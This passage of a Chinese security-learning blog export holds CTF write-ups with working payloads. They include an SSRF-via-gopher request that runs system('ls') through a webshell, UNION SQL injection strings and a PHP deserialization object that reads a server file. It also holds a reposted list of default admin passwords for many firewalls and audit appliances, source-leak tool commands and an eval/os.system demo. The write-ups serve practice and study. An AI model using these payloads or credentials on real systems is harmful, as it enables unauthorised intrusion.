die(&#39;This is webshell&#39;);\n    &#125;\n&#125;\n\n通过分析他是需要IP地址是127.0.0.1才能够进入post阶段。\n我是直接http://152.136.63.75:8016/?url=127.0.0.1/webshe11231231231.php访问的。\n回显：You aren’t admin!\n于是继续去，我起初直接使用了post方法去提交admin=h1admin，结果当然是不行的，后来也是向别人请教才搞懂的，原来是要用gopher协议才行。后来就是要构建一个payload了，可是我不知道怎么搞就上网百度了学习了一下。\nexp&#x3D;&#39;&#39;&#39;\\\nPOST &#x2F;webshe11231231231.php HTTP&#x2F;1.1\nHost:127.0.0.1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko&#x2F;20100101 Firefox&#x2F;75.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\nAccept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application&#x2F;x-www-form-urlencoded\nContent-Length: 34\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nadmin&#x3D;h1admin&amp;hacker&#x3D;system(&#39;ls&#39;);\n&#39;&#39;&#39;\nimport urllib\nfrom urllib.parse import quote\ntmp &#x3D; quote(exp)\nnew &#x3D; tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)\nresult &#x3D; &quot;_&quot;+quote(new)\nprint(result)\n\n运行得到一个url编码的payload\n\n构造http://152.136.63.75:8016/?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A61.0%2529%2520Gecko/20100101%2520Firefox/75.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252034%250D%250ACookie%253A%2520Phpstorm-c2b818%253Dbe05b847-c935-441b-bdb7-465508c336b0%250D%250AConnection%253A%2520close%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527ls%2527%2529%253B%250D%250A\n访问后回显目录\n\n发现一个fl1234aaaaaggggg.php\n和之前一样构建?url=file:///var/www/html/fl1234aaaaaggggg.php\n和之前一样没有回显，查看源代码\n发现flag\n\nflag{Th1s_EaSy_sSRF}\n这题用到了SSRF+gopher攻击。\n0x0003 crypto1n&#x3D;1606938044309278499168642398192229212629290234347717645487123 \ne&#x3D;0x10001 \ncipher&#x3D;1206101155741464091016050901578054614292420649123909371122176 \n\n这题直接给了n，e和cipher。首先就是要做n的大数分解，我这里是用了一个在线大数分解网站\n\n还好n不大，我就成功分解得到了p和q了。\n这下就是RSA中已知p、q、e的情况了。直接用脚本。\nimport gmpy2\nimport libnum\n\nn=1606938044309278499168642398192229212629290234347717645487123\np=1267650600235241044365044382487                   #大数分解得到p和q\nq=1267650600260888172240281085029\ne=0x10001\nciper=1206101155741464091016050901578054614292420649123909371122176\n\nphi =(p-1)*(q-1)                      #计算n的欧拉函数值\nd = gmpy2.invert(e,phi)               #d * e≡1 mod phi\n#print(d)\nm=pow(ciper,d,n)                      #m≡c^d mod n \n#print(m)\nprint(libnum.n2s(m))\n\n就是一个比较常见的RSA，也就会这一种，其他RSA不懂了。。\n\n运行一下脚本，成功得到了flag。\nflag{n_is_too_small!!!}\n0x0004 web1日常先去扫一下目录看看有没有什么提示信息。\n\n看到了robots.txt ，那刚好就去看一下。顺便访问一下其他的user.php\n\n在robots.txt中看到了一个user.php的备份文件，把他下载到了本地，user.php直接访问是什么都没有的，源代码也是空白。那么就只能从备份文件入手了。\n&lt;?php\n\n\nclass UserInfo\n&#123;\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    &#123;\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    &#125;\n\n    function get($url)\n    &#123;\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) &#123;\n            return 404;\n        &#125;\n        curl_close($ch);\n\n        return $output;\n    &#125;\n\n    public function getBlogContents ()\n    &#123;\n        return $this->get($this->blog);\n    &#125;\n\n    public function isValidBlog ()\n    &#123;\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    &#125;\n\n&#125;\n\n从源码可以看出存在SSRF漏洞，但是blog是做了一个正则匹配的。\n有一个注册和登录按钮，我先去做一个账号注册。\n\n注册了一个hahaha用户名的用户。\n打开我们hahaha的主页，注意到了URL中的传入的no参数。试了一下是否存在注入漏洞，发现存在注入漏洞，但是他进行了一定的过滤。\n经过测试发现有4列\n?no=13+union+select+1,2,3,4发现有过滤，这个是没法用的。\n?no=13/**/union/**/select/**/1,2,3,4%23发现没有显示我们需要的显示，还是正常显示，所以有可能是只显示一行。\n?no=13/**/union/**/select/**/1,2,3,4/**/limit/**/1,1%23，有结果了，发现第2列可以用来显示信息。\n\n试着查询了一下版本：10.2.26-MariaDB-log\n数据库名称为fakebook\n我们看一下表名\nno=13/**/union/**/select/**/1,table_name,3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1%23\n找到了一个users的表\n\nno=13/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#39;users&#39;/**/limit/**/1,1%23\n找到了列名\n看看data。\n\n这是我注册的账号的data，没有仅仅的SQL注入这么简单。这题可能涉及到了序列化。\n\n顶部的提示更加佐证这点，有一个反序列化函数报错了。说明他在显示网页内容是要对我们注册时的数据进行一次反序列化操作，而从代码来看，这里的反序列化后curl执行的URL是没有经过正则过滤的。\nno=13/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;haha&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;/**/limit/**/1,1%23传入一个序列化的数据，得到一个base64编码。\n\n解码一下得到了flag{A5168B63-4213-4D92-BC88-26F934A7BB7B}\n\n这里是SQL＋SSRF+反序列化结合解答出来的。\n","slug":"星阑平台练习","date":"2020-04-10T15:54:22.000Z","categories_index":"CTF","tags_index":"WEB,Misc,Crypto","author_index":"A1andNS"},{"id":"b2e98445dd6803f9f6409873488359c5","title":"常用网络安全设备默认口令","content":"本文转载自https://www.cnblogs.com/R3col/p/12452571.html\n一个搜密码平台http://www.sopwd.com/\n\n\n\n产品名称\n默认账号\n默认密码\n\n\n\n深信服产品\nsangfor\nsangfor sangfor@2018 sangfor@2019\n\n\n深信服科技 AD\n\ndlanrecover\n\n\n深信服负载均衡 AD 3.6\nadmin\nadmin\n\n\n深信服WAC ( WNS V2.6)\nadmin\nadmin\n\n\n深信服VPN\nAdmin\nAdmin\n\n\n深信服ipsec-VPN (SSL 5.5)\nAdmin\nAdmin\n\n\n深信服AC6.0\nadmin\nadmin\n\n\nSANGFOR防火墙\nadmin\nsangfor\n\n\n深信服AF(NGAF V2.2)\nadmin\nsangfor\n\n\n深信服NGAF下一代应用防火墙(NGAF V4.3)\nadmin\nadmin\n\n\n深信服AD3.9\nadmin\nadmin\n\n\n深信服上网行为管理设备数据中心\nAdmin\n密码为空\n\n\nSANGFOR_AD_v5.1\nadmin\nadmin\n\n\n网御漏洞扫描系统\nleadsec\nleadsec\n\n\n天阗入侵检测与管理系统 V7.0\nAdmin\nvenus70\n\n\nAudit\nvenus70\n\n\n\nadm\nvenus70\n\n\n\n天阗入侵检测与管理系统 V6.0\nAdmin\nvenus60\n\n\nAudit\nvenus60\n\n\n\nadm\nvenus60\n\n\n\n网御WAF集中控制中心(V3.0R5.0)\nadmin\nleadsec.waf\n\n\naudit\nleadsec.waf\n\n\n\nadm\nleadsec.waf\n\n\n\n联想网御\nadministrator\nadministrator\n\n\n网御事件服务器\nadmin\nadmin123\n\n\n联想网御防火墙PowerV\nadministrator\nadministrator\n\n\n联想网御入侵检测系统\nlenovo\ndefault\n\n\n网络卫士入侵检测系统\nadmin\ntalent\n\n\n网御入侵检测系统V3.2.72.0\nadm\nleadsec32\n\n\nadmin\nleadsec32\n\n\n\n联想网御入侵检测系统IDS\nroot\n111111\n\n\nadmin\nadmin123\n\n\n\n科来网络回溯分析系统\ncsadmin\ncolasoft\n\n\n中控考勤机web3.0\nadministrator\n123456\n\n\nH3C iMC\nadmin\nadmin\n\n\nH3C SecPath系列\nadmin\nadmin\n\n\nH3C S5120-SI\ntest\n123\n\n\nH3C智能管理中心\nadmin\nadmin\n\n\nH3C ER3100\nadmin\nadminer3100\n\n\nH3C ER3200\nadmin\nadminer3200\n\n\nH3C ER3260\nadmin\nadminer3260\n\n\nH3C\nadmin\nadminer\n\n\nadmin\nadmin\n\n\n\nadmin\nh3capadmin\n\n\n\nh3c\nh3c\n\n\n\n360天擎\nadmin\nadmin\n\n\n网神防火墙\nfirewall\nfirewall\n\n\n天融信防火墙NGFW4000\nsuperman\ntalent\n\n\n黑盾防火墙\nadmin\nadmin\n\n\nrule\nabc123\n\n\n\naudit\nabc123\n\n\n\n华为防火墙\ntelnetuser\ntelnetpwd\n\n\nftpuser\nftppwd\n\n\n\n方正防火墙\nadmin\nadmin\n\n\n飞塔防火墙\nadmin\n密码为空\n\n\nJuniper_SSG__5防火墙\nnetscreen\nnetscreen\n\n\n中新金盾硬件防火墙\nadmin\n123\n\n\nkill防火墙(冠群金辰)\nadmin\nsys123\n\n\n天清汉马USG防火墙\nadmin\nvenus.fw\n\n\nAudit\nvenus.audit\n\n\n\nuseradmin\nvenus.user\n\n\n\n阿姆瑞特防火墙\nadmin\nmanager\n\n\n山石网科\nhillstone\nhillstone\n\n\n绿盟安全审计系统\nweboper\nweboper\n\n\nwebaudit\nwebaudit\n\n\n\nconadmin\nconadmin\n\n\n\nadmin\nadmin\n\n\n\nshell\nshell\n\n\n\n绿盟产品\n\nnsfocus123\n\n\nTopAudit日志审计系统\nsuperman\ntalent\n\n\nLogBase日志管理综合审计系统\nadmin\nsafetybase\n\n\n网神SecFox运维安全管理与审计系统\nadmin\n!1fw@2soc#3vpn\n\n\n天融信数据库审计系统\nsuperman\ntelent\n\n\nHillstone安全审计平台\nhillstone\nhillstone\n\n\n网康日志中心\nns25000\nns25000\n\n\n网络安全审计系统（中科新业）\nadmin\n123456\n\n\n天玥网络安全审计系统\nAdmin\ncyberaudit\n\n\n明御WEB应用防火墙\nadmin\nadmin\n\n\nadmin\nadminadmin\n\n\n\n明御攻防实验室平台\nroot\n123456\n\n\n明御安全网关\nadmin\nadminadmin\n\n\n明御运维审计与册风险控制系统\nadmin\n1q2w3e\n\n\n\nsystem\n1q2w3e4r\n\n\n\nauditor\n1q2w3e4r\n\n\n\noperator\n1q2w3e4r\n\n\n明御网站卫士\nsysmanager\nsysmanager888\n\n\n亿邮邮件网关\neyouuser\neyou_admin\n\n\n\neyougw\nadmin@(eyou)\n\n\n\nadmin\n+-ccccc\n\n\n\nadmin\ncyouadmin\n\n\nWebsense邮件安全网关\nadministrator\nadmin\n\n\n梭子鱼邮件存储网关\nadmin\nadmin\n\n\n","slug":"常用网络安全设备默认口令","date":"2020-04-10T14:47:34.000Z","categories_index":"学习笔记","tags_index":"网络安全,WEB,密码口令","author_index":"A1andNS"},{"id":"5d5602ee59abc860badf926b643c5130","title":"Python小练习和一些突发奇想","content":"今天无意接触了一题Python练习题，刚好试试手。结果确实很有效果。\n题目随机输入10个不重复的正整数，然后输出排序后的数列。\n具体要求：\n（1）每次输入一个数前，都提示“请输入第X个数字”\n（2）如果输入的数字有重复，提示“数字有重复”之后，继续提示“请输入第X个数字”\n（3）如果输入的内容不是数字，提示“必须输入数字”之后，继续提示“请输入第X个数字”\n（4）如果正确输入完第10个数字之后，显示从小到大排序后的10个数字的列表。\n（提示：while结构list列表X代表具体的第几个数）\n源代码x = 1\nls = []\nwhile x &lt;= 10:\n    try:\n        number = int(input(\"请输入第\" + str(x) + \"个数字:\"))\n        if number in ls:\n            print(\"数字有重复\")\n            continue\n        ls.append(number)\n        x += 1\n    except:\n        print(\"必须输入数字\")\n        continue\nls.sort()\nprint(ls)\n\n运行效果\n问题与思考虽然程序很简单，但是一开始由于我在某些函数的选择上出了点问题所以还是画了点时间。在输入语句那，我起初使用了eval()来进行自动类型转换，但是由于x变量的缘故，在输入x字符时程序认为x是整型变量x，所以不会报错而是把x变量对应的数字传给了number变量。后来还好想到直接使用强制类型转换来解决问题。eval虽好用，但是也会导致一些不需要的执行产生。这在之前学习eval函数的时候就已经谈到过了。但是有给我一个想法了，eval和system函数结合起来执行命令。\n奇思妙想如果把eval和system函数结合起来执行命令，那么效果就是eval函数把输入语句进行执行，到达命令执行目的。\n案例代码极其简单，就是一个原理演示：\n产生命令执行的原因是import了一个os库，并且有一个未经过过滤的eval函数。\nimport os\na &#x3D; eval(input(&quot;&quot;))\n\n输入效果我首先试一下输入os.system(&quot;ping www.baidu.com&quot;)\n\n再来一个ifconfig\n\n这样也是可以成功执行的，编程的好习惯很重要，不要随便引入没有用到的函数库，这对安全可能会造成一定的威胁。例如os库的任意引用，加上过度信任用户输入，就会导致一些不利的后果。\n","slug":"Python小练习和一些突发奇想","date":"2020-04-09T07:19:49.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"fabd85a3186e7876568f09aa83605b1b","title":"Java之继承学与练","content":"由于清明节休息了几天，今天重新开工了。今天学习了java继承相关的知识，然后做做练习。\n继承的概念继承是java面向对象编程技术的一块基石，因为它允许创建分等级层次的类。\n继承就是子类继承父类的特征和行为，使得子类对象（实例）具有父类的实例域和方法，或子类从父类继承方法，使得子类具有父类相同的行为。\nJava 不支持多继承，但支持多重继承！！！\n基础格式class 父类 &#123;\n&#125;\n \nclass 子类 extends 父类 &#123;\n&#125;\n\n继承的特性\n子类拥有父类非 private 的属性、方法。\n子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。\n子类可以用自己的方式实现父类的方法。\nJava 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。\n提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。\n\n继承关键字extends关键字在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。\nimplements关键字使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。\nsuper 与 this 关键字super关键字：我们可以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。\nthis关键字：指向自己的引用。\nfinal关键字final 关键字声明类可以把类定义为不能继承的，即最终类；或者用于修饰方法，该方法不能被子类重写。\n练习题目\n备注：题目额外要求使用方法来间接调用Student类的成员变量。\n源代码package Student;              //设置包名\n\nclass Student &#123;              //设置学生类\n\tint studentNum;\n\tString studentName;\n\tdouble mathScore , computerScore;\n\tStudent(int num,String name, double math, double computer)&#123;   //建立构造方法\n\t\tstudentNum = num;\n\t\tstudentName = name;\n\t\tmathScore = math;\n\t\tcomputerScore = computer;\n\t&#125;\n\t\n\tpublic void setStudentNum(int newNum)&#123;\n\t\tstudentNum = newNum;\n\t&#125;\n\t\n\tpublic int getStudentNum()&#123;\n\t\treturn studentNum;\n\t&#125;\n\n\tpublic void setName(String newName)&#123;\n\t\tstudentName = newName;\n\t&#125;\n\t\n\tpublic String getName()&#123;\n\t\treturn studentName;\n\t&#125;\n\t\n\tpublic void setMathScore(double newMathScore)&#123;\n\t\tmathScore = newMathScore;\n\t&#125;\n\t\n\tpublic double getMathScore()&#123;\n\t\treturn mathScore;\n\t&#125;\n\t\n\tpublic void setComputerScore(double newComputerScore)&#123;\n\t\tcomputerScore = newComputerScore;\n\t&#125;\n\t\n\tpublic double getComputerScore()&#123;\n\t\treturn computerScore;\n\t&#125;\n\t\n\t\n\tpublic void print() &#123;\n\t\tSystem.out.println(\"学生档案\\n\" + \"学号为：\" + getStudentNum() +\"\\n\" + \"姓名为：\" + getName() + \"\\n\" + \"数学成绩为：\" + getMathScore() + \"\\n\" + \"计算机成绩为：\" + getComputerScore());\n\t&#125;\n\n&#125;\n\nclass PostGraduate extends Student&#123;   //继承Student父类\n\tString teacherName;\n\tString studyDirection;\n\tPostGraduate(int num,String name, double math, double computer ,String tName, String sDire) &#123;                  //构造方法\n\t\tsuper(num,name,math,computer);     //构造方法中的继承\n\t\tteacherName = tName;\n\t\tstudyDirection = sDire;\n\t&#125;\n\tpublic void setTeacherName(String newTName) &#123;\n\t\tteacherName = newTName;\n\t&#125;\n\t\n\tpublic String getTeacherName() &#123;\n\t\treturn teacherName;\n\t&#125;\n\t\n\tpublic void setStudyDirection(String newSDire) &#123;\n\t\tstudyDirection = newSDire;\n\t&#125;\n\t\n\tpublic String getStudyDirection() &#123;\n\t\treturn studyDirection;\n\t&#125;\n\t\n\tpublic void print() &#123;       //继承部分父类方法\n\t\tSystem.out.println(\"学生档案\\n\" + \"学号为：\" + super.getStudentNum() +\"\\n\" + \"姓名为：\" \n\t\t+ super.getName() + \"\\n\" + \"数学成绩为：\" + super.getMathScore() + \"\\n\" + \"计算机成绩为：\" \n\t\t+ super.getComputerScore() + \"\\n\" + \"导师姓名：\" + getTeacherName() +\"\\n\" + \"研究方向：\" \n\t\t+ getStudyDirection());\n\t&#125;\n&#125;\n\npublic class Main&#123;         //设置主类\n\tpublic static void main(String[] args) &#123;\n\t\tSystem.out.println(\"---------------------------------------------------------------------\");\n\t\tStudent a = new Student(1234567,\"Alan\",88.88,90.21);\n\t\ta.print();\n\t\tSystem.out.println(\"---------------------------------------------------------------------\");\n\t\tPostGraduate b = new PostGraduate(1234567,\"Alan\",88.88,90.21,\"ben\",\"cyberspace securety\");\n\t\tb.print();\n\t&#125;\n&#125;\n\n运行效果\n注意我在完成源代码编程后执行了源程序，完美执行了，这里指的是在eclipse中，但是我却在终端中运行失败了，如下图所示，我还以为环境出了问题，其实环境什么的并没有出现问题。\n那么问题出在哪里了呢？\n其实很简单就是我使用的java命令出错了，说到底其实是因为在编写源程序时使用了package，所以要执行package中的程序，就不能简单的在class文件所在目录下使用java命令来执行。而是要切换到package所在的目录，使用java Student.Main来进行运行就OK了，如运行效果图所示。\n \n","slug":"Java之继承学与练","date":"2020-04-08T11:27:14.000Z","categories_index":"Java学习","tags_index":"Java","author_index":"A1andNS"},{"id":"53f021fefa774733d1cd3e617665097b","title":"CTFHub技能树之密码口令","content":"今日继续做\n0x0001 弱口令通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。\n\n弱口令爆破我是使用burpsuit工具来进行爆破，主要还是字典很关键，一开始用的字典就没有爆出来，后来换了一个才爆破出来，说起来字典确实很重要，一个优秀的字典往往事半功倍。\n很快就爆破出来了。\n\n也是很让我震惊，密码是admin。。。。\n\n得到ctfhub{16b11ee2817a754c8d7f83d51dee006dbbfe11f8}\n0x0002 默认口令这题把我搞懵逼了，一脸懵逼，一下子不知道如何是好，所以就试着去按弱密码搞了一下，显然是没有结果的。\n\n没法子上网百度了一下默认口令，结果还真有。\n\n我这里使用的是eyougw和admin@(eyou)的组合实现的，默认口令登陆。\n\nctfhub{75ca614d99a741dd3a9af0ff60976f70e36a2eae}\n默认口令知识多啊！等等转一篇默认口令博客留底。\n","slug":"CTFHub技能树之密码口令","date":"2020-04-03T12:51:54.000Z","categories_index":"CTF","tags_index":"WEB","author_index":"A1andNS"},{"id":"36a94c9540a0ae0f6cf64f5945275ac2","title":"CTFHub技能树信息泄露最后两题","content":"今天就把技能树里面的信息泄露收尾了，干了这最后两题\n0x0001 SVN泄露当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。\n网页提示flag在服务端旧版本源代码中。\n使用dirsearch扫一下网站，找到了.svn目录\n\n使用dvcs-ripper工具，clone .svn目录到本机\n\n.svn目录下有wc.db文件，先去这里面找找看，在Linux查看.db文件要先安装一个sqlitebrowser，我是使用这个sqlite3图形化应用来查看的。\n\n试着访问一下这个文件，发现是404，在发行网页上已经被删除了。\n在本地的.svn目录下的pristine缓存中寻找，在17文件夹下，找到了svn-base文件\n\n打开.svn-base文件，flag就在里面。\nctfhub{6cab499bdf577665c53cca3c26277e274c578fc2}\n0x0002 .HG泄露当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。\n进去提示：Flag 在服务端旧版本的源代码中, 不太好使的情况下, 试着手工解决。\n老规则还是先扫一下后台目录。\n\n利用dvcs-ripper工具\n\n查看文件，发现了flag文件。\n转到data/发现什么都没有，所以选择去网页上访问。\n\n得到flag：ctfhub{4ca6120182a9a22118f9996e5aee7951eaea7c11}\n总结这两题比较类似，都是涉及到版本管理的信息泄露题。都可以利用dvcs-ripper工具来clone泄露目录到本地，在使用SVN和Mercurial进行版本管理和部署的时候需要核查一下是否有把这些敏感目录也部署到线上环境里。\n","slug":"CTFHub技能树信息泄露最后两题","date":"2020-04-03T05:04:21.000Z","categories_index":"CTF","tags_index":"WEB,信息泄露","author_index":"A1andNS"},{"id":"f1953cde70037836ff5e06b15265596d","title":"常见的Web源码泄露","content":"本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。\n这几天都在CTFHub上接触信息泄露类的东西，所以就乘热打铁记录一下常见的源码泄漏问题，这些在web渗透测试和CTF也是中出现。学到了一个GitHacker工具，确实对于git泄露很有用。\n源码泄漏分类.hg源码泄漏漏洞成因：\nhg init的时候会生成.hg ，而管理员一时不小心，就会导致.hg目录公开泄露了。大多数这种类型泄露原理几乎一致。在URL中一般是如下格式：\nhttp://www.test.com/.hg/\n漏洞利用：\n利用.hg泄露可以用到一个工具dvcs-ripper\n工具：dvcs-ripper\n下载地址：https://github.com/kost/dvcs-ripper\n#漏洞利用的代码\nperl rip-hg.pl -v -u http://www.test.com/.hg/\n\n.git源码泄漏漏洞成因：\n在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。\n昨天就接触了git泄露相关内容了。例如下面路径，可以利用dirsearch工具扫描后台目录。\nhttp://www.test.com/.git\n漏洞利用：\n工具：GitHack、dvcs-ripper\n但是我更喜欢用GitHack，附下载连接https://github.com/BugScanTeam/GitHack\n#GitHack\nGitHack.py http://www.test.com/.git/\n#dvcs-ripper\nperl rip-git.pl -v -u http://www.test.com/.git/\n\n\n.DS_Store文件泄漏漏洞成因:\n.DS_Store是Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。之前遇到的比较简单都是直接下载，后来去百度，发现有利用脚本。\n漏洞利用:\nhttp://www.test.com/.ds_store\n工具：dsstoreexp\n工具链接：https://github.com/lijiejie/ds_store_exp\n#dsstoreexp\npython ds_store_exp.py http://www.test.com/.DS_Store\n#工具使用之前要先安装依赖，到dsstoreexp目录下。\npip install -r requirements.txt\n\n\n网站备份压缩文件在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。\n漏洞成因及危害:\n该漏洞的成因主要有以下两种：\n\n服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。\n编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。\n\n漏洞检测:\n该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。\n.rar\n.zip\n.7z\n.tar.gz\n.bak\n.swp\n.txt\n.html\n\n可以利用一些后台扫描工具，可以快速扫描看看有没有泄露文件，但是这也只能针对于一些名称固定或比较参加的备份文件名，跟多时候还是要自己判断和尝试其是否有备份文件。我在Linux系统下使用dirsearch工具来进行扫描的，以前都是使用御剑来扫，其实工具只是一个，字典的丰富程度可能更加重要。\nSVN导致文件泄露Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。\nSubversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。\n例如：http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries\n漏洞利用:\n工具：dvcs-ripper\n#dvcs-ripper，这工具挺通用的，好东西啊！！！\n perl rip-svn.pl -v -u http://www.example.com/.svn/\n#Seay-Svn\n\n\nWEB-INF/web.xml泄露WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。\nWEB-INF主要包含以下文件或目录：\n&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\n&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件\n&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。\n&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件\n\n漏洞成因：\n通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。\n漏洞检测以及利用方法：\n通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\n一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！\nCVS泄漏漏洞利用\n测试的目录\nhttp:&#x2F;&#x2F;url&#x2F;CVS&#x2F;Root 返回根信息\nhttp:&#x2F;&#x2F;url&#x2F;CVS&#x2F;Entries 返回所有文件的结构\n\n#取回源码的命令\nbk clone http:&#x2F;&#x2F;url&#x2F;name dir\n\n这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。\n查看所有的改变的命令，转到download的目录\nbk changes\nBazaar&#x2F;bzr\n\n工具：\ndvcs-ripper\nperl rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;\n\n本文涉及工具及下载地址其实本文中都有了，最后再统一写一下吧！\ndvcs-ripper https://github.com/kost/dvcs-ripper\nGitHacker https://github.com/BugScanTeam/GitHack\ndestoreexp https://github.com/lijiejie/ds_store_exp\n备注：GitHacker版本有很多，可以自己寻找测试。dvcs-ripper工具要使用必须要安装相应的环境，例如perl、svn等。\n参看资料http://www.mottoin.com/95749.html\nhttps://zhuanlan.zhihu.com/p/21296806\nhttp://www.s2.sshz.org/post/source-code-leak/\n","slug":"常见的Web源码泄露","date":"2020-04-02T02:38:56.000Z","categories_index":"学习笔记","tags_index":"WEB,信息泄露","author_index":"A1andNS"},{"id":"484224831f5c00a6a576cf9c15449d62","title":"每日练习-git泄露","content":"继续昨天的信息泄露,ctfhub技能树的git泄露，go！go！go！\n0x0001 log根据提示这就是一题典型的git泄露题目。直接使用githacker工具。\n不然的话，一般都是先做目录扫描，存在.git时就可以使用工具恢复了。\n第一步就是使用工具恢复git，clone目标源代码到本地去\n\n然后到dist目录里找到新clone的文件夹，根据题目log，到里面去使用终端git log查看一下历史。\n\n可以看到初始化后，添加了一个flag，然后有删除了一个flag。所以我们要去看看add flag的记录。使用git diff 